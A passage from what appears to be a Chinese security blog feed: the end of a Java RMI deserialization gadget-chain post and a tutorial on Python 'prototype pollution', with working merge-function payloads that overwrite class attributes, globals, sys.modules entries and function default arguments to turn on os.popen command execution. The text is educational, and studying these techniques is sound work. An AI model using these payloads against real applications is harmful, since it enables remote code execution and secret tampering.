   <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> ctor.newInstance(Target.class, transformedMap);</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="远程加载对象"><a href="#远程加载对象" class="headerlink" title="远程加载对象"></a>远程加载对象</h4><p>和上边Server打Client一样利用条件非常苛刻</p><p>参考：<a href="https://paper.seebug.org/1091/#serverrmi">https://paper.seebug.org/1091/#serverrmi</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RMI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python Prototype Pollution</title>
      <link href="/2024/02/20/python/Python%20Prototype%20Pollution/"/>
      <url>/2024/02/20/python/Python%20Prototype%20Pollution/</url>
      
        <content type="html"><![CDATA[<h2 id="Python-Prototype-Pollution"><a href="#Python-Prototype-Pollution" class="headerlink" title="Python Prototype Pollution"></a>Python Prototype Pollution</h2><p>Python原型链污染通常是指通过某种方式非法地修改了对象的原型链，导致对象访问到了不应该访问到的属性或方法，或者对象的属性被非法地修改</p><p>Python中，这通常意味着通过修改类的<code>__dict__</code>或对象的<code>__class__</code>属性，来实现对类或对象属性的非法修改</p><h3 id="基类"><a href="#基类" class="headerlink" title="基类"></a>基类</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">string = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(string.__class__) <span class="comment"># &lt;class &#x27;str&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(string.__class__.__base__) <span class="comment"># &lt;class &#x27;object&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">function</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(function.__class__) <span class="comment"># &lt;class &#x27;function&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(function.__class__.__base__) <span class="comment"># &lt;class &#x27;object&#x27;&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    secret = <span class="string">&quot;xxxx&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_b</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将源字典 src 中的键值对合并到目标对象 dst 中</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = son_b()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;secret&quot;</span>: <span class="string">&quot;no&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(son_a.secret) <span class="comment"># xxxx</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret) <span class="comment"># xxxx</span></span><br><span class="line"></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(son_a.secret) <span class="comment"># no</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret) <span class="comment"># no</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 污染内置属性</span></span><br><span class="line"><span class="comment"># payload = &#123;</span></span><br><span class="line"><span class="comment">#     &quot;__class__&quot; : &#123;</span></span><br><span class="line"><span class="comment">#         &quot;__base__&quot; : &#123;</span></span><br><span class="line"><span class="comment">#             &quot;__str__&quot; : &quot;Polluted&quot;</span></span><br><span class="line"><span class="comment">#         &#125;</span></span><br><span class="line"><span class="comment">#     &#125;</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># print(father.__str__) #&lt;slot wrapper &#x27;__str__&#x27; of &#x27;object&#x27; objects&gt;</span></span><br><span class="line"><span class="comment"># merge(payload, instance)</span></span><br><span class="line"><span class="comment"># print(father.__str__) #Polluted</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="无法污染的Object"><a href="#无法污染的Object" class="headerlink" title="无法污染的Object"></a>无法污染的Object</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">merge(payload, <span class="built_in">object</span>)</span><br><span class="line"><span class="comment"># 报错：TypeError: can&#x27;t set attributes of built-in/extension type &#x27;object&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="全局变量获取"><a href="#全局变量获取" class="headerlink" title="全局变量获取"></a>全局变量获取</h3><p><code>__init__</code> 初始化类，返回的类型是function</p><p><code>__globals__</code> 函数名.<code>__globals__</code>，获取function所处空间下可使用的module、方法以及所有变量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">funcrion</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">a</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(funcrion.__globals__ == <span class="built_in">globals</span>() == a.__init__.__globals__)  <span class="comment"># True</span></span><br></pre></td></tr></table></figure><p><code>__globlasl__</code>来获取全局变量，可以修改无继承的关系类属性甚至全局变量</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;secretkey&quot;</span> <span class="punctuation">:</span> <span class="number">123</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="已加载模块获取"><a href="#已加载模块获取" class="headerlink" title="已加载模块获取"></a>已加载模块获取</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pollution.py</span></span><br><span class="line">improt test.py</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment"># test.py</span></span><br><span class="line">secretkey = <span class="number">222</span></span><br></pre></td></tr></table></figure><p><code>sys</code>的模块<code>modules</code>属性以字典的形式包含了程序自开始运行时所有已加载过的模块，可以直接从该属性中获取到目标模块</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;test&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;secretkey&quot;</span> <span class="punctuation">:</span> <span class="number">123</span><span class="punctuation">,</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;sys&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;modules&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;test&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;secretkey&quot;</span> <span class="punctuation">:</span> <span class="number">123</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="加载器"><a href="#加载器" class="headerlink" title="加载器"></a>加载器</h3><p>Python中加载器<code>loader</code>为实现模块加载而设计的类，其在<code>importlib</code>这个内置模块中具体实现</p><p>importlib模块下所有的py文件中均引入了sys模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib.__init__&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib._bootstrap&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib._bootstrap_external&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib._common&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib.abc&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib.machinery&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib.metadata&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib.resources&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib.util&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br></pre></td></tr></table></figure><p>只要能够过度获取到一个<code>loader</code>，便能用同样<code>loader.__init__.__globals__[&#39;sys&#39;]</code>的方式获取<code>sys</code>模块</p><p><code>__spec__</code>内置属性在Python 3.4版本引入，其涉及到关于类加载时的信息，本身就是定义在的Lib&#x2F;importlib&#x2F;_bootstrap.py类ModuleSpec，显然因为定义在importlib模块下的py文件，所以可以直接采用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;模块名&gt;.__spec__.__init__.__globals__[&#x27;sys&#x27;]获取到sys模块</span><br></pre></td></tr></table></figure><p>ModuleSpec属性值的设置，还有一种相对较高的payload获取方式，主要是利用ModuleSpec中的<code>loader</code>属性，该属性值是模块加载时所使用的<code>loader</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;模块名&gt;.__spec__.loader.__init__.__globals__[&#x27;sys&#x27;]</span><br></pre></td></tr></table></figure><h3 id="函数形参默认值替换"><a href="#函数形参默认值替换" class="headerlink" title="函数形参默认值替换"></a>函数形参默认值替换</h3><h4 id="defaults"><a href="#defaults" class="headerlink" title="__defaults__"></a><code>__defaults__</code></h4><p><code>__defaults__</code>是一个元组(tuple)，它存储了函数定义中所有形参的默认值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">var_1, var_2 =<span class="number">2</span>, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">function</span>(<span class="params">var_1, /, var_2 =<span class="number">2</span>, *, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(func.__defaults__) <span class="comment">#(2, 3)</span></span><br><span class="line"><span class="built_in">print</span>(function.__defaults__) <span class="comment">#(2,)</span></span><br></pre></td></tr></table></figure><p>通过属性替换实现函数位置或键值对的默认值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">evilFunc</span>(<span class="params">arg_1 , shell = <span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> shell:</span><br><span class="line">        <span class="built_in">print</span>(arg_1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(arg_1).read())</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;evilFunc&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;__defaults__&quot;</span> : (</span><br><span class="line">                    <span class="literal">True</span> ,</span><br><span class="line">                )</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">evilFunc(<span class="string">&quot;whoami&quot;</span>) <span class="comment"># whoami</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line">evilFunc(<span class="string">&quot;whoami&quot;</span>) <span class="comment"># root</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="kwdefaults"><a href="#kwdefaults" class="headerlink" title="__kwdefaults__"></a><code>__kwdefaults__</code></h4><p><code>__kwdefaults__</code>是一个字典(dictionary)，它存储了函数定义中所有关键字参数（即指定了<code>*</code>的参数）的默认值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">var_1, var_2 =<span class="number">2</span>, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">function</span>(<span class="params">var_1, /, var_2 =<span class="number">2</span>, *, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(func.__kwdefaults__) <span class="comment"># None</span></span><br><span class="line"><span class="built_in">print</span>(function.__kwdefaults__) <span class="comment"># &#123;&#x27;var_3&#x27;: 3&#125;</span></span><br></pre></td></tr></table></figure><p>通过属性替换实现函数位置或键值对的默认值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">evilFunc</span>(<span class="params">arg_1, *, shell=<span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> shell:</span><br><span class="line">        <span class="built_in">print</span>(arg_1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(arg_1).read())</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;evilFunc&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;__kwdefaults__&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;shell&quot;</span>: <span class="literal">True</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">evilFunc(<span class="string">&quot;whoami&quot;</span>) <span class="comment"># whoami</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line">evilFunc(<span class="string">&quot;whoami&quot;</span>) <span class="comment"># uname</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="特定值替换"><a href="#特定值替换" class="headerlink" title="特定值替换"></a>特定值替换</h3><h4 id="os-environ"><a href="#os-environ" class="headerlink" title="os.environ"></a><code>os.environ</code></h4><p>Python 中 <code>os</code> 模块提供的一个接口，用于访问和修改环境变量。环境变量是操作系统定义的一些变量，通常用于存储与系统行为或应用程序配置相关的信息</p><h5 id="os-environ-keys"><a href="#os-environ-keys" class="headerlink" title="os.environ.keys()"></a><code>os.environ.keys()</code></h5><p>主目录下所有的 key</p><p>windows：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">os.environ[&#x27;HOMEPATH&#x27;]:当前用户主目录</span><br><span class="line">os.environ[&#x27;TEMP&#x27;]:临时目录路径</span><br><span class="line">os.environ[&quot;PATHEXT&quot;]:可执行文件</span><br><span class="line">os.environ[&#x27;SYSTEMROOT&#x27;]:系统主目录</span><br><span class="line">os.environ[&#x27;LOGONSERVER&#x27;]:机器名</span><br><span class="line">os.environ[&#x27;PROMPT&#x27;]:设置提示符</span><br></pre></td></tr></table></figure><p>linux：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">os.environ[&#x27;USER&#x27;]:当前使用用户</span><br><span class="line">os.environ[&#x27;LC_COLLATE&#x27;]:路径扩展的结果排序时的字母顺序</span><br><span class="line">os.environ[&#x27;SHELL&#x27;]:使用shell的类型</span><br><span class="line">os.environ[&#x27;LAN&#x27;]:使用的语言</span><br><span class="line">os.environ[&#x27;SSH_AUTH_SOCK&#x27;]:ssh的执行路径</span><br></pre></td></tr></table></figure><h5 id="os-environ-get"><a href="#os-environ-get" class="headerlink" title="os.environ.get()"></a><code>os.environ.get()</code></h5><p>os.environ 是一个环境变量的字典，可以通过 get 方法获取键对应的值。如果有这个键，返回对应的值，如果没有，则返回 none</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="built_in">print</span>(os.environ.get(<span class="string">&quot;HOME&quot;</span>))</span><br></pre></td></tr></table></figure><p>也可以设置默认值，当键存在时返回对应的值，不存在时，返回默认值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(os.environ.get(<span class="string">&quot;HOME&quot;</span>, <span class="string">&quot;default&quot;</span>)) <span class="comment"># 环境变量HOME不存在，返回default</span></span><br></pre></td></tr></table></figure><h5 id="设置系统环境变量"><a href="#设置系统环境变量" class="headerlink" title="设置系统环境变量"></a>设置系统环境变量</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span 